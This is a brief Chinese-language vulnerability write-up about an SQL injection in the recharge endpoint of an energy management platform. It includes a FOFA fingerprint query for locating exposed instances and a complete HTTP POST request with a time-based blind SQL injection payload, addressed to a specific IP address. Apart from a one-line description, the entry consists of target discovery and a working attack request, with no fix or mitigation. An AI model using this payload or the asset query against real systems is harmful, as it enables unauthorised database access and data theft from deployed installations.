# 玛智慧能源管理平台recharge存在SQL注入

# 一、漏洞简介
玛智慧能源管理平台recharge存在SQL注入，易被攻击者获取大量信息等


# 二、资产测绘
+ fofa`icon_hash="-53758288"`

# 三、漏洞复现
```
POST /life/recharge.action HTTP/1.1Host: 153.0.139.173Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type:application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0

userId=-1';waitfor delay '0:0:5'--+qs
```
